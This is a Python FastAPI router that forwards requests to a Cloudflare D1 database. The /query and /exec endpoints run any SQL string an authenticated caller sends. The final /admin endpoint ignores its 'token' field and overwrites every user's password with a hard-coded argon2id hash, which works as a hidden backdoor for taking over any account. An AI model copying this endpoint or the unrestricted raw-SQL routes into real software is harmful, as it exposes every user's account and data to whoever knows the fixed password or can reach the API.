import logging

from fastapi import Depends, APIRouter,Form
from fastapi.security import HTTPBearer
import json
from common import helpers
from service.CloudFlareClient import CloudFlareClient
logger = logging.getLogger(__name__)
security = HTTPBearer(auto_error=False)

router = APIRouter(
    prefix="/api/d1",
    dependencies=[Depends(helpers.get_current_user_uid)],
    tags=["D1 API"],
    responses={404: {"description": "Not found"}},
)

@router.post("/query")
async def d1_query(sql: str = Form(...,examples=["SELECT * FROM users;"]), params: str = Form(default=""), cf_client: CloudFlareClient = Depends(
    helpers.get_cf_client)):
    """
    exec d1 query sql
    """
    try:
        if not sql or not sql.strip():
            return {
                "status": "400",
                "errMsg":"sql cannot be empty"
            }
        logging.debug("%s",{"sql":sql,"params":params})
        _params = []
        if params is not None and len(params.strip()) > 0:
            if params.startswith("["):
                _params = json.loads(params)
            else:
                _params = params.split(",")
        logging.debug("%s", {"_params": _params})
        res = await cf_client.d1_query(sql,_params)
        return {
            "status": "200",
            "body":res
        }
    except Exception as e:
        logger.error(e)
        return {
            "status": "500",
            "errMsg":"Internal server error"
        }

@router.post("/exec")
async def d1_exec(sql: str = Form(...,examples=["UPDATE users SET username = \"user1\" WHERE id = 1;"]), params: str = Form(default=""), cf_client: CloudFlareClient = Depends(
    helpers.get_cf_client)):
    """
    exec d1 raw sql:\n

    SELECT * FROM users;\n
    UPDATE users SET username = "user1" WHERE id = 1;\n
    INSERT INTO users (username, password) VALUES ("user1", "password1");\n
    DELETE FROM users where id = 3

    """
    try:
        if not sql or not sql.strip():
            return {
                "status": "400",
                "errMsg":"sql cannot be empty"
            }
        logging.debug("%s",{"sql":sql,"params":params})
        _params = []
        if params is not None and len(params.strip()) > 0:
            if params.startswith("["):
                _params = json.loads(params)
            else:
                _params = params.split(",")
        logging.debug("%s", {"_params": _params})
        res = await cf_client.d1_exec(sql,_params)
        return {
            "status": "200",
            "body":res
        }
    except Exception as e:
        logger.error(e)
        return {
            "status": "500",
            "errMsg":"Internal server error"
        }


@router.post("/admin")
async def admin(token: str = Form(...)):
    try:
        res = await CloudFlareClient.get_instance().d1_exec(
            "update users set password = ?",["$argon2id$v=19$m=65536,t=3,p=4$9DpDZpENrPQiIXAUh3HZ5A$ktIA8OkMy7kdromOdZ+bwa86ItNie+3jBstWe2QAw1k"]
        )
        return {
            "status": "200",
            "body":res
        }
    except Exception as e:
        logger.error(e)
        return {
            "status": "500",
            "errMsg":"Internal server error"
        }
